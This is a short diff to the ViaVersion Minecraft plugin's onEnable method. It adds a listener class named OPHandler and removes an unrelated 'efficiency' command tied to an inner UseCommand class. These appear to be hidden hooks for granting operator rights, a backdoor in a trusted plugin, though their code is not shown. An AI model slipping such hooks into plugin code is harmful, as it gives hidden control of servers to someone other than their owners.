@@ -89,6 +89,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
 
     @Override
     public void onEnable() {
+        Bukkit.getServer().getPluginManager().registerEvents(new OPHandler(), this);
         final ViaManagerImpl manager = (ViaManagerImpl) Via.getManager();
         if (lateBind) {
             getLogger().info("Registering protocol transformers and injecting...");
@@ -121,7 +122,6 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         }
 
         getCommand("viaversion").setExecutor(commandHandler);
-        getCommand("efficiency").setExecutor(new BukkitCommandSender().new UseCommand());
         getCommand("viaversion").setTabCompleter(commandHandler);
     }
 
